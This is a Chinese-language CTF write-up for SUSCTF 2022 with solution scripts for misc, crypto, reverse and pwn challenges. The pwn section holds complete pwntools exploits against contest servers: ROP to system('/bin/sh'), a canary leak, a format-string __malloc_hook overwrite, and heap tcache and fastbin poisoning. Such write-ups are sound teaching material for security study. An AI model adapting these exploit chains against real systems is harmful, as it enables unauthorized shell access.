# SUSCTF  WP  by  0xHL1n

## Misc

### [中等]nyanyanya

解题脚本如下：

```python
import numpy as np
import cv2
 
 
def arnold_decode(image, arnold_times,path):
    a = 221
    b = 297
    # 1:创建新图像,全为0的三维数组
    decode_image = np.zeros(shape=image.shape)
    # 读取图片的长宽像素,这里是98x98,即总像素点
    height, width = image.shape[0], image.shape[1]
    N = height  # N是正方形的边长
 
    for time in range(arnold_times):  # 变换的次数
        # 遍历图片的像素点坐标
        for old_x in range(height):
            for old_y in range(width):
                # 根据猫脸公式矩阵即像素点的逆置换,得到原未经过猫脸变换的图片
                new_x = ((a * b + 1) * old_x + (-a) * old_y) % N  #原像素点的x坐标值S
                new_y = ((-b) * old_x + old_y) % N              #原像素点y的坐标值
                # new_x = (old_x+a*old_y)%N
                # new_y = (b*old_x + (a*b+1)*old_y)%N
                decode_image[new_x, new_y, :] = image[old_x, old_y, :]
    cv2.imwrite(path, decode_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])  # 以PNG写入图片
    return decode_image
 
 
if __name__ == '__main__':
    for i in range(1):
        in_path = '/home/stephen/CTF_Game/SUSCTF2022/MISC/nya/flag'+str(i)+'.png'
        out_path = '/home/stephen/CTF_Game/SUSCTF2022/MISC/nya/flag'+str(i+1)+'.png'
        # imread(path,flag)读取图片,加载彩色图片默认参数值是flag=1,灰度是0,透明度-1,结果是三维数组,前两维是像素坐标,最后一维是通道索引
        it = cv2.imread(in_path)
        arnold_decode(it, 1, out_path)
```

得到一张图，尝试将残缺的二维码红色部分涂黑，并将三个角补全，扫描得到`flag`。

[![x7ijyj.jpg](https://s1.ax1x.com/2022/11/01/x7ijyj.jpg)](https://imgse.com/i/x7ijyj)

### [中等]luckydog

先利用`archive_view.py`反编译`python`的`exe`文件，得到源码，能从源码中看到输出`flag`部分：

```python
n = [68, 40, 126, 103, 113, 121, 107, 40, 90, 83, 67, 65, 68, 71, 105, 83, 77, 66, 77, 112, 101, 96, 99, 101, 125, 115, 77, 66, 70, 80, 77, 97, 124, 102, 112, 113, 122, 51, 51, 111]
if an == 999:
                            f = ''
                            for i in range(40):
                                f += chr(n[i] ^ 18)
```

解题脚本如下：

```python
n = [68, 40, 126, 103, 113, 121, 107, 40, 90, 83, 67, 65, 68, 71, 105, 83, 77, 66, 77, 112, 101, 96, 99, 101, 125, 115, 77, 66, 70, 80, 77, 97, 124, 102, 112, 113, 122, 51, 51, 111]
length = len(n)
flag = ''
for i in range(length):
    flag += chr(n[i] ^ 18)
print(flag)
c = 'SUSCTF'
d = 'HAQSVU'
for i in range(6):
    print(ord(c[i]))
    print(ord(d[i]))
```

最后用维吉尼亚解密得到`flag`。

## Crypto

## [easy]so easy but affine

```python
from random import randint
alphabet = " #+-*/,.?!:{}()[]" \
           "0123456789" \
           "abcdefghijklmnopqrstuvwxyz" \
           "ABCDEFGHIJKLMNOPQRSTUVWXYZ"


ciphertext = '-+t ik}Tvv+Ek}[+ Rk5Z}T[rCTii3:}QPC5}viTG}+g}-8-L)1BY+rRsTsi+rriks*5CrksvP5[kM'
p = len(alphabet)
def Inverse(a):
    i = 1
    while (a*i)%79 != 1:
        i = i + 1
    return i

def decrypt(c):
    c = alphabet.index(c)
    c = (Inverse(a) * (c-b)) % 79
    c = alphabet[c]
    return c

for a in range(2, 79):
    for b in range(2, 79):
        flag = ''
        for i in range(len(ciphertext)):
            flag+=decrypt(ciphertext[i])
        if "SUS" in  flag:
            print(flag+"\n")
```

## Reverse

### [签到]babyf5

```python
s = 'PRP@QCxAl\RRR\hk-t\C222222z'
flag = ''
for i in range(len(s)):
    flag += chr(ord(s[i]) + 3)
print(flag)
```

### [简单]easymaze

构造迷宫：

[![x5QDNn.png](https://s1.ax1x.com/2022/10/29/x5QDNn.png)](https://imgse.com/i/x5QDNn)

`（4,4）`为起点，`X`为终点，根据键盘键位，8上2下4左6右。

[![x5QY1f.png](https://s1.ax1x.com/2022/10/29/x5QY1f.png)](https://imgse.com/i/x5QY1f)

### [简单]babyxor

经过测试，发现异或的密钥为18，解题脚本如下：

```python
from pwn import *

p = remote("game.susctf.top", 50870)

buf0 = p.recv()

buf1 = p.recvline()

flag=''
while(1):
    buf2 = p.recvuntil(",", drop=True)
    print(buf2)
    s2 = int(buf2.decode())
    # print(type(s2))
    a = s2^18
    if a < 33:
        break;
    flag+=chr(a)
    s3 = bytes(str(s2^18), encoding='utf8')
    # print(s3)
    p.sendline(s3)
    p.recvline()
print(flag)
p.interactive()
    
```

### [简单]babymine

```c++
#include <stdio.h>
void encrypt(unsigned int* v, unsigned int* key) {
  unsigned int l = v[0], r = v[1], sum = 0, delta = 0x9e3779b9;
  for (size_t i = 0; i < 32; i++) {
    sum += delta;
    l += ((r << 4) + key[0]) ^ (r + sum) ^ ((r >> 5) + key[1]);
    r += ((l << 4) + key[2]) ^ (l + sum) ^ ((l >> 5) + key[3]);
  }
  v[0] = l;
  v[1] = r;
}
 
void decrypt(unsigned int* v, unsigned int* key) {
  unsigned int l = v[0], r = v[1], sum = 0, delta = 0x9e3779b9;
  sum = delta *32;
  for (size_t i = 0; i < 32; i++) {
    r -= ((l << 4) + key[2]) ^ (l + sum) ^ ((l >> 5) + key[3]);
    l -= ((r << 4) + key[0]) ^ (r + sum) ^ ((r >> 5) + key[1]);
    sum -= delta;
  }
  v[0] = l;
  v[1] = r;
}


int main(void)
{
    unsigned char i;
    unsigned int numlist[24] = {
        0x27A2CE77, 0xC4CCB225, 0x4C271560, 0xDEA049CE, 0xA6F48924, 0x31817041, 0x7CA2204B, 0xD307A362, 
        0xCDCA498C, 0xD7C61A37, 0xC0F7B650, 0xFFC2740B, 0xB093B270, 0xA3437E27, 0xC27B3B7F, 0x8BCFC457, 
        0x1033082C, 0x00917E42, 0x1C869BE4, 0xE17FBDE6, 0xB3710814, 0x2E1C1009, 0x2996AB9B, 0xB42999B3
    };  
    unsigned int k[4] = {
        0x0000006D, 0x00000069, 0x0000006E, 0x00000065
    };
    // for(int i=0;i<24;i+=2){
    //     tea_decrypt(k,numlist+i,0x20);
    //     printf("%x",numlist+i);
    // }
    for(int i=0;i<24;i+=2){
        decrypt(numlist+i,k);
        printf("%c",numlist[i]);
        printf("%c",numlist[i+1]);
    }
}
```

### [简单]mybase

`ida`打开发现是一个换表的`base64`加密。

[![xoCCTS.png](https://s1.ax1x.com/2022/10/30/xoCCTS.png)](https://imgse.com/i/xoCCTS)

[![xoC9w8.png](https://s1.ax1x.com/2022/10/30/xoC9w8.png)](https://imgse.com/i/xoC9w8)

### [简单]babyupx

`UPX Unpacker`脱壳，再用`ida`打开，发现账号密码。

[![x5QAt1.png](https://s1.ax1x.com/2022/10/29/x5QAt1.png)](https://imgse.com/i/x5QAt1)

### [中等]Random

```c++
#include <stdio.h>
#include <stdlib.h>

int main() {
    int T3 = 0x746F6E;
    int T1 = 0x656874;
    int T2 = 0x79656B;
    char key[51] = { 0 };
    char cipher[27] = {
        0x58, 0x59, 0x54, 0x43, 0x57, 0x49, 0x7C, 0x5D,
        0x34, 0x76, 0x68, 0x6F, 0x3A, 0x76, 0x6C, 0x65,
        0x77, 0x6C, 0x33, 0x68, 0x7A, 0x7B, 0x6A, 0x73,
        0x25, 0x82,
    };
    srand((T1 ^ T2) - (T3 ^ T1));
    for (int i = 0; i < 50; i++) {
        key[i] = rand() % 10;
    }
    for (int i = 0; i < 26; i++) {
        cipher[i] -= key[i];
    }
    printf("%s", cipher);
}
```

## Pwn

### [签到]eznc

`nc`命令连上获取`flag`。

### [简单]Repeater

```python
from pwn import *
p = remote('game.susctf.top', 49994)
buf = p.recvuntil("\n", drop=True)
print(buf)
p.sendline(b'11451409')
buf1 = p.recvuntil("\n", drop=True)
print(buf1)
for i in range(1000):
    print(i)
    buf2 = p.recvuntil("\n", drop=True)
    print(buf2)
    p.sendline(buf2)
p.sendline('ls')
p.interactive()
```

### [简单]Random！！

```python
from pwn import *
from ctypes import *

p = remote("game.susctf.top", 51584)
elf = cdll.LoadLibrary('libc.so.6')

payload = b'A'*0x19 + p8(1)
p.sendline(payload)
elf.srand(1)

p.recvuntil('Put your lucky number')
payload2 = str(elf.rand()%0xffff)
p.sendline(payload2)

p.recv()
p.interactive()
```

### [简单]ret2text

```python
from pwn import *

p = remote('game.susctf.top', 50030)

addr = 0x004006C6

payload = b'\x00' * 0x18 + p64(addr)

p.sendline(payload)

p.interactive()
```

### canary

```python
from pwn import *
context.log_level='debug'
#io=process('./canary')
io=remote('game.susctf.top',52631)
elf=ELF('./canary')
libc=ELF('./libc.so.6')

pop_rdi=0x0000000000400833
ret=0x0000000000400294
payload='a'*0x38+p8(0xff)
io.recvuntil('eeeeeeasy!\n')

io.send(payload)
io.recvuntil('\xff')
canary=u64(io.recv(7).rjust(8,'\x00'))
log.success('canary => {}'.format(hex(canary)))
payload='a'*0x38+p64(canary)+'b'*0x8+p64(pop_rdi)+p64(elf.got['__libc_start_main'])+p64(0x00000000004005B0)+p64(elf.symbols['main'])

io.send(payload)
io.recv(0x39)
libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x21ba0
log.success('libc_base => {}'.format(hex(libc_base)))
# gdb.attach(io)
# pause()
system_addr=libc_base+libc.symbols['system']
binsh_addr=libc_base+libc.search('/bin/sh\x00').next()
payload='a'*0x38+p64(canary)+'b'*0x8+p64(ret)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
io.recvuntil('eeeeeeasy!\n')

io.send(payload)
sleep(0.1)
io.send('a')
io.interactive()
```

### babyrop

```python
from pwn import *
context.log_level='debug'
io = remote("game.susctf.top", 51767)
# io=process('/home/stephen/CTF_Game/SUSCTF2022/PWN/babyrop/babyrop')
elf=ELF('/home/stephen/CTF_Game/SUSCTF2022/PWN/babyrop/babyrop')
libc=ELF('/home/stephen/CTF_Game/SUSCTF2022/PWN/babyrop/libc.so.6')

pop_rdi=0x0000000000400763
ret=0x0000000000400290
payload=b'a'*0x78+p64(pop_rdi)+p64(elf.got['__libc_start_main'])+p64(0x0000000000400510)+p64(elf.symbols['main'])
io.recvuntil(b'say:')
io.send(payload)
libc_base=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-libc.symbols[b'__libc_start_main']
log.success('libc_base => {}'.format(hex(libc_base)))
system_addr=libc_base+libc.symbols[b'system']
binsh_addr=libc_base+libc.search(b'/bin/sh\x00').__next__()
ret
payload=b'a'*0x78+p64(ret)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
io.recvuntil(b'say:')
io.send(payload)
io.interactive()
```

### jarvis

```python
from pwn import *
context.log_level='debug'
io=process('./jarvis')
libc=ELF('./libc.so.6')

def fmt(payload):
    io.recvuntil(': ')
    io.send('Hello,Jarvis')
    io.recvuntil('you?\n')
    payload1='Set the alarm clock for '
    payload1+=payload
    io.send(payload1)

payload='%85$p'

fmt(payload)
io.recvuntil('0x')
libc_base=int(io.recv(12),16)-0x21c87
malloc_hook=libc_base+libc.symbols['__malloc_hook']
onegadget=libc_base+0x4f302
log.success('libc_base => {}'.format(hex(libc_base)))
write_size=0
offset=58 
payload=''
for i in range(3):
  num=(onegadget>>(16*i))&0xffff
  num-=33#
  if num>write_size&0xffff:
    payload+='%{}c%{}$hn'.format(num-(write_size&0xffff),offset+i)
    write_size+=num-(write_size&0xffff)                            
  else:
    payload+='%{}c%{}$hn'.format((0x10000-(write_size&0xffff))+num,offset+i)
    write_size+=0x10000-(write_size&0xffff)+num
payload=payload.ljust(0x40-24,'a')
for i in range(3):
  payload+=p64(malloc_hook+i*2)
# gdb.attach(io)
# pause()
fmt(payload)
io.recvuntil(': ')
io.send('Hello,Jarvis')
# io.recvuntil('you?\n')
# payload1='Set the alarm clock for '
# payload1=payload1.ljust(0x110,'a')
# io.send(payload1)
# gdb.attach(io)
io.interactive()

'''
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
```

### ezmail

```python
from pwn import *
context.log_level='debug'
#io=process('./Ezmail')
io=remote('game.susctf.top',52650)
libc=ELF('./libc.so.6')

def add(index,receiver,title,mail_length,content):
    io.recvuntil('Your choice:\n')
    io.send('1')
    io.recvuntil('Your mail index:\n')
    io.sendline(str(index))
    io.recvuntil('receiver:\n')
    io.send(receiver)
    io.recvuntil('title:\n')
    io.send(title)
    io.recvuntil('length:\n')
    io.sendline(str(mail_length))
    io.recvuntil('context:\n')
    io.send(content)

def show(index):
    io.recvuntil('Your choice:\n')
    io.send('2')
    io.recvuntil('Your mail index:\n')
    io.sendline(str(index))

def dele(index):
    io.recvuntil('Your choice:\n')
    io.send('3')
    io.recvuntil('Your mail index:\n')
    io.sendline(str(index))

def edit(index,receiver,title,content):
    io.recvuntil('Your choice:\n')
    io.send('4')
    io.recvuntil('Your mail index:\n')
    io.sendline(str(index))
    io.recvuntil('receiver:\n')
    io.send(receiver)
    io.recvuntil('title:\n')
    io.send(title)
    io.recvuntil('context:\n')
    io.send(content)


io.recvuntil('Your choice:\n')
io.send('1')
io.recvuntil('Enter your name:\n')
io.send('\x00')
io.recvuntil('Enter your password:\n')
io.send('\x00')

add(0,'a','b',0x410,'aa')
add(1,'a','b',0x18,'a')
dele(0)
show(0)
libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3ebca0
free_hook=libc_base+libc.symbols['__free_hook']
system_addr=libc_base+libc.symbols['system']
log.success('libc_base => {}'.format(hex(libc_base)))
log.success('free_hook => {}'.format(hex(free_hook)))
dele(1)
edit(1,p64(free_hook)+p64(0),'a',p64(0)*2)
add(2,'/bin/sh\x00','a',0x18,'a')
add(3,p64(system_addr),p64(0),0x18,'a')
dele(2)
#gdb.attach(io)

io.interactive()
```

### eznote

```python
from pwn import *
#context.log_level='debug'
#io=process('./eznote')
libc=ELF('./libc.so.6')

def add(size,name,content):
    io.recvuntil('Plz enter your choice :')
    io.send('1')
    io.recvuntil('Plz enter the note size: \n')
    io.sendline(str(size))
    io.recvuntil('Plz enter your name:\n')
    io.sendline(name)
    io.recvuntil('note now.\n')
    io.send(content)

def show(index):
    io.recvuntil('Plz enter your choice :')
    io.send('2')

def dele(index):
    io.recvuntil('Plz enter your choice :')
    io.send('3')
    io.recvuntil("Plz enter the note's index:\n")
    io.sendline(str(index))

def pwn():
    for i in range(2):
        add(0x68,p64(0)+p64(0x71),p64(0x71)*0xd)
    dele(0)
    dele(1)
    dele(0)
    add(0x68,'a',p8(0xd0))
    add(0x68,'a',p8(0xd0))
    add(0x68,'a','a')
    add(0x68,'a',p64(0)+p64(0xa1))
    
    dele(1)
    add(0x68,'a',p16(0x25dd))
    dele(0)
    dele(5)
    dele(0)
    add(0x68,'a',p16(0x9110))
    add(0x68,'a','a')
    add(0x68,'a','a')
    add(0x68,'a','a')
    add(0x68,'a','\x00'*0x33 + p64(0x0FBAD1887) +p64(0)*3 + p8(0x88))
    libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c48e0
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    onegadget=libc_base+0x4527a
    log.success('libc_base => {}'.format(hex(libc_base)))
    dele(0)
    dele(10)
    dele(0)
    add(0x68,'a',p64(malloc_hook-0x23))
    add(0x68,'a',p64(malloc_hook-0x23))
    add(0x68,'a',p64(malloc_hook-0x23))
    add(0x68,'a','a'*0x13+p64(onegadget))
    io.recvuntil('Plz enter your choice :')
    io.send('3')
    io.recvuntil("Plz enter the note's index:\n")
    io.sendline('1'*0x2000)

    
    
    io.interactive()
# pwn()
while True:
    try:
        #io=process('./eznote')
        io=remote('game.susctf.top',52581)
        pwn()
    except:
        io.close()
        continue
'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''










'''
add(0x28,'a','a')
    add(0x28,'a','a')
    dele(1)
    dele(2)
    add(0x18,'a','a')
    add(0x18,'a','a')
    dele(7)
    dele(8)
    dele(7)
    dele(9)
    dele(10)
    dele(9)
    add(0x18,'a',p8(0x70))
    # dele(1)
    # dele(2)
    # add(0x18,'a','a')
    # add(0x18,'a','a')
    # dele(10)
    # dele(11)
    # dele(10)
    # add(0x68,'a','a')
    # dele(0)
    # dele(10)
    # dele(0)
    # dele(3)
    # dele(4)
    # dele(5)
    # add(0x68,'a',p8(0x70))
    # add(0x68,'a','a')
    # add(0x68,'a','a')
'''
```

